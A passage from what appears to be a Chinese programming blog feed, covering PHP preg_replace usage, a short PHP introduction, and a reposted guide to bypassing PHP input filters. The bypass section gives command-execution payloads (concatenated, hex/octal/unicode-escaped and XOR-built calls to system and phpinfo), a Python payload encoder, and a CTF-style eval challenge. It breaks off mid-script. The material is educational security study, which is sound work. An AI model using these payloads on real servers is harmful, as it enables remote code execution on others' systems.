<span class="token keyword">echo</span> <span class="token function">preg_replace</span><span class="token punctuation">(</span><span class="token string">"/&lt;[0-9]?>/"</span><span class="token punctuation">,</span><span class="token string">""</span><span class="token punctuation">,</span><span class="token variable">$str</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token comment" spellcheck="true">//输出acsdcs&lt;55555555>sc&lt;6666>sdcd</span>
<span class="token delimiter">?></span>

看<span class="token punctuation">[</span><span class="token number">0</span><span class="token operator">-</span><span class="token number">9</span><span class="token punctuation">]</span><span class="token operator">?</span> 这里的<span class="token operator">?</span>表示要是<span class="token number">0</span>次或<span class="token number">1</span> 次，超过<span class="token number">1</span>次又不符合条件了。
总结一下，上面我们学会了 <span class="token operator">*</span> <span class="token operator">+</span> <span class="token operator">?</span> 和大括号<span class="token punctuation">{</span><span class="token punctuation">}</span>表示重复次数的方法。

<span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span>

    <span class="token variable">$s</span><span class="token operator">=</span><span class="token function">preg_replace</span><span class="token punctuation">(</span><span class="token string">"/（.*?[月票|求|更].*?）/i"</span><span class="token punctuation">,</span><span class="token string">""</span><span class="token punctuation">,</span><span class="token variable">$s</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">preg_match_all</span><span class="token punctuation">(</span>'<span class="token operator">/</span>href<span class="token operator">=</span>\<span class="token string">"([0-9]+)\.shtm"</span><span class="token operator">></span><span class="token punctuation">(</span><span class="token punctuation">.</span><span class="token operator">+</span><span class="token operator">?</span><span class="token punctuation">)</span><span class="token markup">&lt;\/a></span><span class="token operator">/</span>i'<span class="token punctuation">,</span><span class="token variable">$s</span><span class="token punctuation">,</span><span class="token variable">$arr_dstorycate</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    
    <span class="token function">print_r</span><span class="token punctuation">(</span><span class="token variable">$arr_dstorycate</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span>

   <span class="token function">preg_match_all</span><span class="token punctuation">(</span><span class="token string">"/&lt;img.*?src=[\\\'| \\\"](.*?(?:[\.gif|\.jpg]))[\\\'|\\\"].*?[\/]?>/i"</span><span class="token punctuation">,</span><span class="token variable">$content</span><span class="token punctuation">,</span><span class="token variable">$arr_dstorycate</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            
   <span class="token function">print_r</span><span class="token punctuation">(</span><span class="token variable">$arr_dstorycate</span><span class="token punctuation">)</span><span class="token punctuation">;</span> </code></pre>
<p> 补充：</p>
<p>.$pattern是数组,$replace也是数组,则中对应的 元素进行替换</p>
<p>php</p>
<p>preg_replace有五个参数,有三个是必须参数</p>
<p>Preg_replace(mixed $pattern, mixed $replacement, mixed $subject [,int $limit = -1 [,int $count ]]); </p>
<p>$pattern 可以是字符串,字符串数组,或者preg</p>
<p>$replace 是用于替换的字符串或字符串数组</p>
<p>$subject 目标字符串或者目标字符串数组</p>
<p>$limit 每个模式在每个$subject上最大的替换次数,默认是-1(无限次)</p>
<p>$count 返回在目标字符串所替换的次数</p>
<p>在repalce与pattern中有几点要注意的</p>
<p>1.$pattern是数组,$replace也是字符串,那么所有模式都使用这个字符串来匹配;</p>
<p><img src="/2021/06/21/php-preg-replace-han-shu-ying-yong/1.png" alt="1"></p>
<p>2.$pattern是数组,$replace也是数组,则中对应的 元素进行替换</p>
<p><img src="/2021/06/21/php-preg-replace-han-shu-ying-yong/2.png" alt="2"></p>
<p>3.如果数组$pattern大于$replace,则多出来的$pattern用空的字符串进行替换,</p>
<p><img src="/2021/06/21/php-preg-replace-han-shu-ying-yong/3.png" alt="3"></p>
<p>$replace少于$patterns,则匹配到的值全部用空字符串来替换</p>
<p>4.对于上面例子中出现的${1},${2},${3},这个叫做包含后向引用,里面的数字代表原子出现的位数,有两种写法,一种是\n,一种是${n},推荐使用第二种写法.会把目标字符串匹配到的pattern中的原子,按照要求变化目标字符串的格式,或者匹配的原子原样输出(这里举两个例子)</p>
<p><img src="/2021/06/21/php-preg-replace-han-shu-ying-yong/4.png" alt="4"></p>
<p> 把时间按照 下划线分割开来,${3}就是匹配的到$patterns中的第三个原子((\d{1,2})),${4}就是匹配的到$patterns中的第四个原子((\d{1,2}))以此类推,</p>
<p><img src="/2021/06/21/php-preg-replace-han-shu-ying-yong/5.png" alt="5"></p>
<p>例如大家熟悉的smarty模板引擎中编译后替换的方法</p>
<p>5.第四个参数的$limit的使用,第四个参数的意思是每个模式在每个subject上进行替换的最大次数</p>
<p><img src="/2021/06/21/php-preg-replace-han-shu-ying-yong/6.png" alt="6"></p>
<p>如果limit为n,它只用正则替换n次</p>
<p>6.第五个参数$count的使用,$count的意思是,subject目标字符串被替换的次数,拿第五点的例子来说</p>
<p><img src="/2021/06/21/php-preg-replace-han-shu-ying-yong/7.png" alt="7"></p>
<p>上面代码中的例子运行结果如下:</p>
<p><img src="/2021/06/21/php-preg-replace-han-shu-ying-yong/8.png" alt="8"></p>
<p>ps:</p>
<p>preg_replace与str_replace的关系是什么呢?</p>
<p>我们可以理解为str_replace是preg_repalce的一个子集.只是str_replace中的第一个参数写的是string,而preg_replace写的是一个正则表达式</p>
<h1 id="PHP正则表达式修饰符的理解："><a href="#PHP正则表达式修饰符的理解：" class="headerlink" title="PHP正则表达式修饰符的理解："></a><strong>PHP正则表达式修饰符的理解</strong>：</h1><p>​    在PHP正则表达式里面的修饰符可以改变正则的很多特性，使得正则表达式更加适合你的需要（注意：修饰符对于大小写是敏感的，这意味着”e”并不等于”E”）。</p>
<p>​    PHP正则表达式修饰符的种类及介绍：</p>
<p>​    ◆i ：如果在修饰符中加上”i”，则正则将会取消大小写敏感性，即”a”和”A” 是一样的。</p>
<p>​    ◆m：默认的正则开始”^”和结束”$”只是对于正则字符串如果在修饰符中加上”m”，那么开始和结束将会指字符串的每一行：每一行的开头就是”^”，结尾就是”$”。</p>
<p>​    ◆s：如果在修饰符中加入”s”，那么默认的”.”代表除了换行符以外的任何字符将会变成任意字符，也就是包括换行符！</p>
<p>​    ◆x：如果加上该修饰符，表达式中的空白字符将会被忽略，除非它已经被转义。</p>
<p>​    ◆e：本修饰符仅仅对于replacement有用，代表在replacement中作为PHP代码。</p>
<p>​    ◆A：如果使用这个修饰符，那么表达式必须是匹配的字符串中的开头部分。比如说”/a/A”匹配”abcd”。</p>
<p>​    ◆E：与”m”相反，如果使用这个修饰符，那么”$”将匹配绝对字符串的结尾，而不是换行符前面，默认就打开了这个模式。</p>
<p>​    ◆U：和问号的作用差不多，用于设置”贪婪模式”。</p>
]]></content>
      <tags>
        <tag>PHP</tag>
      </tags>
  </entry>
  <entry>
    <title>PHP:介绍</title>
    <url>/2020/10/01/php-jie-shao/</url>
    <content><![CDATA[<h2 id="PHP-是什么？"><a href="#PHP-是什么？" class="headerlink" title="PHP 是什么？"></a>PHP 是什么？</h2><ul>
<li>PHP（全称：PHP：Hypertext Preprocessor，即”PHP：超文本预处理器”）是一种通用开源脚本语言。</li>
<li>PHP 脚本在服务器上执行。</li>
<li>PHP 可免费下载使用。</li>
</ul>
<h2 id="PHP-文件是什么？"><a href="#PHP-文件是什么？" class="headerlink" title="PHP 文件是什么？"></a>PHP 文件是什么？</h2><ul>
<li>PHP 文件可包含文本、HTML、JavaScript代码和 PHP 代码</li>
<li>PHP 代码在服务器上执行，结果以纯 HTML 形式返回给浏览器</li>
<li>PHP 文件的默认文件扩展名是 “.php”</li>
</ul>
<h2 id="为什么使用-PHP？"><a href="#为什么使用-PHP？" class="headerlink" title="为什么使用 PHP？"></a>为什么使用 PHP？</h2><ul>
<li>PHP 可在不同的平台上运行（Windows、Linux、Unix、Mac OS X 等）</li>
<li>PHP 与目前几乎所有的正在被使用的服务器相兼容（Apache、IIS 等）</li>
<li>PHP 提供了广泛的数据库支持</li>
<li>PHP 是免费的，可从官方的 PHP 资源下载它：<a href="http://www.php.net/"> www.php.net</a></li>
<li>PHP 易于学习，并可高效地运行在服务器端</li>
</ul>
]]></content>
  </entry>
  <entry>
    <title>PHP:过滤限制绕过方法</title>
    <url>/2021/07/21/php-guo-lu-xian-zhi-rao-guo-fang-fa/</url>
    <content><![CDATA[<p><a href="https://blog.csdn.net/mochu7777777/article/details/104631142">https://blog.csdn.net/mochu7777777/article/details/104631142</a></p>
<h3 id="代码执行函数"><a href="#代码执行函数" class="headerlink" title="代码执行函数"></a>代码执行函数</h3><p>首先来看看在PHP中有哪些函数有代码执行的功能</p>
<h4 id="eval"><a href="#eval" class="headerlink" title="eval()"></a>eval()</h4><p>最常见的代码执行函数，把字符串 code 作为PHP代码执行。</p>
<pre class=" language-php"><code class="language-php"><span class="token function">eval</span> <span class="token punctuation">(</span> string <span class="token variable">$code</span> <span class="token punctuation">)</span> <span class="token punctuation">:</span> mixed</code></pre>
<h4 id="assert"><a href="#assert" class="headerlink" title="assert()"></a>assert()</h4><p>检查一个断言是否为false</p>
<pre class=" language-php"><code class="language-php"><span class="token constant">PHP</span> <span class="token number">5</span>
<span class="token function">assert</span> <span class="token punctuation">(</span> mixed <span class="token variable">$assertion</span> <span class="token punctuation">[</span><span class="token punctuation">,</span> string <span class="token variable">$description</span> <span class="token punctuation">]</span> <span class="token punctuation">)</span> <span class="token punctuation">:</span> bool</code></pre>
<pre class=" language-php"><code class="language-php"><span class="token constant">PHP</span> <span class="token number">7</span>
<span class="token function">assert</span> <span class="token punctuation">(</span> mixed <span class="token variable">$assertion</span> <span class="token punctuation">[</span><span class="token punctuation">,</span> Throwable <span class="token variable">$exception</span> <span class="token punctuation">]</span> <span class="token punctuation">)</span> <span class="token punctuation">:</span> bool</code></pre>
<p>assert()会检查指定的assertion并在结果为false时采取适当的行动。在PHP5或PHP7中，如果assertion是字符串，它将会被assert()当做PHP代码来执行。</p>
<h4 id="preg-replace-e"><a href="#preg-replace-e" class="headerlink" title="preg_replace()+/e"></a>preg_replace()+/e</h4><p>执行一个正则表达式的搜索和替换</p>
<pre><code>preg_replace ( mixed $pattern , mixed $replacement , mixed $subject [, int $limit = -1 [, int &amp;$count ]] ) : mixed</code></pre>
<p>搜索subject中匹配pattern的部分，以replacement进行替换。如果pattern的模式修饰符使用/e，那么当subject被匹配成功时，replacement会被当做PHP代码执行</p>
<pre><code>PS： preg_replace()+函数的/e修饰符在PHP7中被移除</code></pre>
<p><img src="/2021/07/21/php-guo-lu-xian-zhi-rao-guo-fang-fa/image-20210722004140595.png" alt="1"></p>
<p><img src="/2021/07/21/php-guo-lu-xian-zhi-rao-guo-fang-fa/image-20210722004201887.png" alt="2"></p>
<h4 id="create-function"><a href="#create-function" class="headerlink" title="create_function()"></a>create_function()</h4><p>创建一个匿名（lambda样式）函数</p>
<pre class=" language-php"><code class="language-php"><span class="token function">create_function</span> <span class="token punctuation">(</span> string <span class="token variable">$args</span> <span class="token punctuation">,</span> string <span class="token variable">$code</span> <span class="token punctuation">)</span> <span class="token punctuation">:</span> string</code></pre>
<p>根据传递的参数创建一个匿名函数，并为其返回唯一的名称。如果没有严格对参数传递进行过滤，攻击者可以构造payload传递给<code>create_function()</code>对<code>参数或函数体</code>闭合注入恶意代码导致代码执行<br><img src="/2021/07/21/php-guo-lu-xian-zhi-rao-guo-fang-fa/image-20210722004301611.png" alt="3"></p>
<h3 id="可回调函数"><a href="#可回调函数" class="headerlink" title="可回调函数"></a>可回调函数</h3><h4 id="array-map"><a href="#array-map" class="headerlink" title="array_map()"></a>array_map()</h4><p>为数组的每个元素应用回调函数</p>
<pre><code>array_map ( callable $callback , array $array , array ...$arrays ) : array</code></pre>
<p>返回数组，是为<code>array</code>每个元素应用<code>callback</code>函数之后的数组。 <code>array_map()</code>返回一个<code>array</code>，数组内容为<code>array1</code>的元素按索引顺序为参数调用<code>callback</code>后的结果（有更多数组时，还会传入<code>arrays</code>的元素）。 <code>callback</code>函数形参的数量必须匹配<code>array_map()</code>实参中数组的数量。</p>
<p><img src="/2021/07/21/php-guo-lu-xian-zhi-rao-guo-fang-fa/image-20210722004401814.png" alt="4"></p>
<h4 id="call-user-func"><a href="#call-user-func" class="headerlink" title="call_user_func()"></a>call_user_func()</h4><p>把第一个参数作为回调函数调用</p>
<pre><code>call_user_func ( callable $callback [, mixed $parameter [, mixed $... ]] ) : mixed</code></pre>
<p>第一个参数<code>callback</code>是被调用的回调函数，其余参数是回调函数的参数。<br><img src="/2021/07/21/php-guo-lu-xian-zhi-rao-guo-fang-fa/image-20210722011136128.png" alt="image-20210722011136128"></p>
<h4 id="call-user-func-array"><a href="#call-user-func-array" class="headerlink" title="call_user_func_array()"></a>call_user_func_array()</h4><p>调用回调函数，并把一个数组参数作为回调函数的参数</p>
<p>call_user_func_array ( callable $callback , array $param_arr ) : mixed</p>
<p>把第一个参数作为回调函数callback调用，把参数数组作param_arr为回调函数的的参数传入。跟array_map()相似<br><img src="/2021/07/21/php-guo-lu-xian-zhi-rao-guo-fang-fa/image-20210722004459054.png" alt="5"></p>
<h4 id="array-filter"><a href="#array-filter" class="headerlink" title="array_filter()"></a>array_filter()</h4><p>用回调函数过滤数组中的单元</p>
<pre><code>array_filter ( array $array [, callable $callback [, int $flag = 0 ]] ) : array</code></pre>
<p>依次将array数组中的每个值传递到callback函数。如果callback函数返回true，则array数组的当前值会被包含在返回的结果数组中。数组的键名保留不变。<br><img src="/2021/07/21/php-guo-lu-xian-zhi-rao-guo-fang-fa/image-20210722004521379.png" alt="6"></p>
<h4 id="usort"><a href="#usort" class="headerlink" title="usort()"></a>usort()</h4><p>使用用户自定义的比较函数对数组中的值进行排序</p>
<pre><code>usort ( array &amp;$array , callable $value_compare_func ) : bool</code></pre>
<p>本函数将用用户自定义的比较函数对一个数组中的值进行排序。 如果要排序的数组需要用一种不寻常的标准进行排序，那么应该使用此函数。</p>
<p>当PHP &lt; 5.6时<br><img src="/2021/07/21/php-guo-lu-xian-zhi-rao-guo-fang-fa/image-20210722004613149.png" alt="7"><br>当PHP &gt;= 5.6 &amp; PHP &lt; 7时，php有一个参数变长特性<br><img src="/2021/07/21/php-guo-lu-xian-zhi-rao-guo-fang-fa/image-20210722004624831.png" alt="8"><br>等等还有很多函数参数是可回调的，就不一一列举了。</p>
<p>接下来根据各种过滤情况来看看具体的一些绕过方法</p>
<h3 id="字符串拼接绕过"><a href="#字符串拼接绕过" class="headerlink" title="字符串拼接绕过"></a>字符串拼接绕过</h3><p>字符串拼接绕过适用于绕过过滤具体关键字的限制</p>
<pre><code>适用PHP版本：PHP&gt;=7</code></pre>
<p><img src="/2021/07/21/php-guo-lu-xian-zhi-rao-guo-fang-fa/image-20210722004702791.png" alt="9"></p>
<p>Payload:</p>
<pre><code>(p.h.p.i.n.f.o)();
(sy.(st).em)(whoami);
(sy.(st).em)(who.ami);
(s.y.s.t.e.m)("whoami");
.......</code></pre>
<pre><code>在PHP中不一定需要引号(单引号/双引号)来表示字符串。PHP支持我们声明元素的类型，比如$name = (string)mochu7;，在这种情况下，$name就包含字符串"mochu7"，此外，如果不显示声明类型，那么PHP会将圆括号内的数据当成字符串来处理</code></pre>
<h3 id="字符串转义绕过"><a href="#字符串转义绕过" class="headerlink" title="字符串转义绕过"></a>字符串转义绕过</h3><pre><code>适用PHP版本：PHP&gt;=7</code></pre>
<p>以八进制表示的[0–7]{1,3}转义字符会自动适配byte（如”\400” == “\000”）<br>以十六进制的\x[0–9A-Fa-f]{1,2}转义字符表示法（如“\x41”）<br>以Unicode表示的\u{[0–9A-Fa-f]+}字符，会输出为UTF-8字符串</p>
<p><strong>注意这里转义后的字符必须双引号包裹传参</strong></p>
<p>Payload处理脚本如下：</p>
<pre class=" language-python"><code class="language-python"><span class="token comment" spellcheck="true"># -*- coding:utf-8 -*-</span>

<span class="token keyword">def</span> <span class="token function">hex_payload</span><span class="token punctuation">(</span>payload<span class="token punctuation">)</span><span class="token punctuation">:</span>
    res_payload <span class="token operator">=</span> <span class="token string">''</span>
    <span class="token keyword">for</span> i <span class="token keyword">in</span> payload<span class="token punctuation">:</span>
        i <span class="token operator">=</span> <span class="token string">"\\x"</span> <span class="token operator">+</span> hex<span class="token punctuation">(</span>ord<span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">:</span><span class="token punctuation">]</span>
        res_payload <span class="token operator">+=</span> i
    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"[+]'{}' Convert to hex: \"{}\""</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span>payload<span class="token punctuation">,</span>res_payload<span class="token punctuation">)</span><span class="token punctuation">)</span>

<span class="token keyword">def</span> <span class="token function">oct_payload</span><span class="token punctuation">(</span>payload<span class="token punctuation">)</span><span class="token punctuation">:</span>
    res_payload <span class="token operator">=</span> <span class="token string">""</span>
    <span class="token keyword">for</span> i <span class="token keyword">in</span> payload<span class="token punctuation">:</span>
        i <span class="token operator">=</span> <span class="token string">"\\"</span> <span class="token operator">+</span> oct<span class="token punctuation">(</span>ord<span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">:</span><span class="token punctuation">]</span>
        res_payload <span class="token operator">+=</span> i
    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"[+]'{}' Convert to oct: \"{}\""</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span>payload<span class="token punctuation">,</span>res_payload<span class="token punctuation">)</span><span class="token punctuation">)</span>

<span class="token keyword">def</span> <span class="token function">uni_payload</span><span class="token punctuation">(</span>payload<span class="token punctuation">)</span><span class="token punctuation">:</span>
    res_payload <span class="token operator">=</span> <span class="token string">""</span>
    <span class="token keyword">for</span> i <span class="token keyword">in</span> payload<span class="token punctuation">:</span>
        i <span class="token operator">=</span> <span class="token string">"\\u{{{0}}}"</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span>hex<span class="token punctuation">(</span>ord<span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
        res_payload <span class="token operator">+=</span> i
    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"[+]'{}' Convert to unicode: \"{}\""</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span>payload<span class="token punctuation">,</span>res_payload<span class="token punctuation">)</span><span class="token punctuation">)</span>

<span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>
    payload <span class="token operator">=</span> <span class="token string">'phpinfo'</span>
    hex_payload<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>
    oct_payload<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>
    uni_payload<span class="token punctuation">(</span>payload<span class="token punctuation">)</span></code></pre>
<p>Payload</p>
<pre><code>"\x70\x68\x70\x69\x6e\x66\x6f"();#phpinfo();
"\163\171\163\164\145\155"('whoami');#system('whoami');
"\u{73}\u{79}\u{73}\u{74}\u{65}\u{6d}"('id');#system('whoami');
"\163\171\163\164\145\155"("\167\150\157\141\155\151");#system('whoami');
.......</code></pre>
<p><img src="/2021/07/21/php-guo-lu-xian-zhi-rao-guo-fang-fa/image-20210722004831266.png" alt="10"><br><img src="/2021/07/21/php-guo-lu-xian-zhi-rao-guo-fang-fa/image-20210722004847635.png" alt="11"></p>
<p><img src="/2021/07/21/php-guo-lu-xian-zhi-rao-guo-fang-fa/image-20210722004900042.png" alt="12">另外，八进制的方法可以绕过无字母传参进行代码执行</p>
<pre><code>"\163\171\163\164\145\155"("\167\150\157\141\155\151");#system('whoami');</code></pre>
<p><img src="/2021/07/21/php-guo-lu-xian-zhi-rao-guo-fang-fa/image-20210722004921639.png" alt="13"></p>
<h3 id="多次传参绕过"><a href="#多次传参绕过" class="headerlink" title="多次传参绕过"></a>多次传参绕过</h3><pre><code>适用PHP版本：无限制</code></pre>
<p>如果过滤了<code>引号(单引号/双引号)，</code>可以通过以下方法绕过<br><img src="/2021/07/21/php-guo-lu-xian-zhi-rao-guo-fang-fa/image-20210722004955533.png" alt="14"></p>
<pre><code>GET:
?1=system&amp;2=whoami
POST:
cmd=$_GET[1]($_GET[2]);</code></pre>
<p><img src="/2021/07/21/php-guo-lu-xian-zhi-rao-guo-fang-fa/image-20210722005011972.png" alt="15"></p>
<pre><code>cmd=$_POST[1]($_POST[2]);&amp;1=system&amp;2=whoami</code></pre>
<p>如果<code>PHP版本大于7</code>这里还可以用拼接的方法绕过过滤引号</p>
<pre><code>(sy.st.em)(whoami);</code></pre>
<p>另外如果碰到参数长度受限制，也可以通过多次传参的方法绕过参数长度限制或者回调函数</p>
<p><img src="/2021/07/21/php-guo-lu-xian-zhi-rao-guo-fang-fa/image-20210722005112326.png" alt="16"></p>
<p>回调函数可能大部分看限制的具体长度，但是在<code>PHP &gt;= 5.6 &amp; PHP &lt; 7</code>时对以上过滤方法可以绕过</p>
<p><img src="/2021/07/21/php-guo-lu-xian-zhi-rao-guo-fang-fa/image-20210722005129999.png" alt="17"></p>
<h3 id="内置函数访问绕过"><a href="#内置函数访问绕过" class="headerlink" title="内置函数访问绕过"></a>内置函数访问绕过</h3><pre><code>适用于PHP版本：Windows本地测试的是PHP&gt;=7可以成功，PHP5测试虽然报错但是并不肯定不能使用</code></pre>
<p>get_defined_functions()：返回所有已定义函数的数组</p>
<p>详情见：<a href="https://www.php.net/manual/zh/function.get-defined-functions.php">https://www.php.net/manual/zh/function.get-defined-functions.php</a></p>
<p>利用这种方法首先还需要知道PHP的具体版本，因为每个版本的get_defined_functions()返回的值都是不一样的，这里以php7.4.3为准<br><img src="/2021/07/21/php-guo-lu-xian-zhi-rao-guo-fang-fa/image-20210722005344190.png" alt="18"></p>
<p><img src="/2021/07/21/php-guo-lu-xian-zhi-rao-guo-fang-fa/image-20210722005358422.png" alt="19"></p>
<h3 id="异或绕过"><a href="#异或绕过" class="headerlink" title="异或绕过"></a><img src="/2021/07/21/php-guo-lu-xian-zhi-rao-guo-fang-fa/image-20210722005412630.png" alt="20">异或绕过</h3><pre><code>适用PHP版本：无限制</code></pre>
<p>在PHP中两个字符串异或之后，得到的还是一个字符串。<br>例如：我们异或 ? 和 ~ 之后得到的是 A<br><img src="/2021/07/21/php-guo-lu-xian-zhi-rao-guo-fang-fa/image-20210722005443996.png" alt="21"></p>
<pre><code>字符：?         ASCII码：63           二进制：  00‭11 1111‬
字符：~         ASCII码：126          二进制：  0111 1110‬
异或规则：
1   XOR   0   =   1
0   XOR   1   =   1
0   XOR   0   =   0
1   XOR   1   =   0
上述两个字符异或得到 二进制：  0100 0001
该二进制的十进制也就是：65
对应的ASCII码是：A</code></pre>
<p>接下来看一道例题：</p>
<pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span>
<span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string">'/[a-z0-9]/is'</span><span class="token punctuation">,</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'shell'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
    <span class="token keyword">echo</span> <span class="token string">"hacker!!"</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span>
    <span class="token function">eval</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'shell'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
<span class="token delimiter">?></span></code></pre>
<p>过滤了所有英文字母和数字，但是我们知道ASCII码中还有很多字母数字之外的字符，利用这些字符进行异或可以得到我们想要的字符</p>
<pre><code>PS：取ASCII表种非字母数字的其他字符，要注意有些字符可能会影响整个语句执行，所以要去掉如：反引号，单引号</code></pre>
<p>脚本如下：</p>
<pre class=" language-python"><code class="language-python"><span class="token comment" spellcheck="true"># -*- coding: utf-8 -*-</span>

payload <span class="token operator">=</span> <span class="token string">"assert"</span>
strlist <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">,</span> <span class="token number">4</span><span class="token punctuation">,</span> <span class="token number">5</span><span class="token punctuation">,</span> <span class="token number">6</span><span class="token punctuation">,</span> <span class="token number">7</span><span class="token punctuation">,</span> <span class="token number">8</span><span class="token punctuation">,</span> <span class="token number">9</span><span class="token punctuation">,</span> <span class="token number">10</span><span class="token punctuation">,</span> <span class="token number">11</span><span class="token punctuation">,</span> <span class="token number">12</span><span class="token punctuation">,</span> <span class="token number">13</span><span class="token punctuation">,</span> <span class="token number">14</span><span class="token punctuation">,</span> <span class="token number">15</span><span class="token punctuation">,</span> <span class="token number">16</span><span class="token punctuation">,</span> <span class="token number">17</span><span class="token punctuation">,</span> <span class="token number">18</span><span class="token punctuation">,</span> <span class="token number">19</span><span class="token punctuation">,</span> <span class="token number">20</span><span class="token punctuation">,</span> <span class="token number">21</span><span class="token punctuation">,</span> <span class="token number">22</span><span class="token punctuation">,</span> <span class="token number">23</span><span class="token punctuation">,</span> <span class="token number">24</span><span class="token punctuation">,</span> <span class="token number">25</span><span class="token punctuation">,</span> <span class="token number">26</span><span class="token punctuation">,</span> <span class="token number">27</span><span class="token punctuation">,</span> <span class="token number">28</span><span class="token punctuation">,</span> <span class="token number">29</span><span class="token punctuation">,</span> <span class="token number">30</span><span class="token punctuation">,</span> <span class="token number">31</span><span class="token punctuation">,</span> <span class="token number">32</span><span class="token punctuation">,</span> <span class="token number">33</span><span class="token punctuation">,</span> <span class="token number">35</span><span class="token punctuation">,</span> <span class="token number">36</span><span class="token punctuation">,</span> <span class="token number">37</span><span class="token punctuation">,</span> <span class="token number">38</span><span class="token punctuation">,</span> <span class="token number">40</span><span class="token punctuation">,</span> <span class="token number">41</span><span class="token punctuation">,</span> <span class="token number">42</span><span class="token punctuation">,</span> <span class="token number">43</span><span class="token punctuation">,</span> <span class="token number">44</span><span class="token punctuation">,</span> <span class="token number">45</span><span class="token punctuation">,</span> <span class="token number">46</span><span class="token punctuation">,</span> <span class="token number">47</span><span class="token punctuation">,</span> <span class="token number">58</span><span class="token punctuation">,</span> <span class="token number">59</span><span class="token punctuation">,</span> <span class="token number">60</span><span class="token punctuation">,</span> <span class="token number">61</span><span class="token punctuation">,</span> <span class="token number">62</span><span class="token punctuation">,</span> <span class="token number">63</span><span class="token punctuation">,</span> <span class="token number">64</span><span class="token punctuation">,</span> <span class="token number">91</span><span class="token punctuation">,</span> <span class="token number">93</span><span class="token punctuation">,</span> <span class="token number">94</span><span class="token punctuation">,</span> <span class="token number">95</span><span class="token punctuation">,</span> <span class="token number">96</span><span class="token punctuation">,</span> <span class="token number">123</span><span class="token punctuation">,</span> <span class="token number">124</span><span class="token punctuation">,</span> <span class="token number">125</span><span class="token punctuation">,</span> <span class="token number">126</span><span class="token punctuation">,</span> <span class="token number">127</span><span class="token punctuation">]</span>
<span class="token comment" spellcheck="true">#strlist是ascii表中所有非字母数字的字符十进制</span>
str1<span class="token punctuation">,</span>str2 <span class="token operator">=</span> <span class="token string">''</span><span class="token punctuation">,</span><span class="token string">''</span>

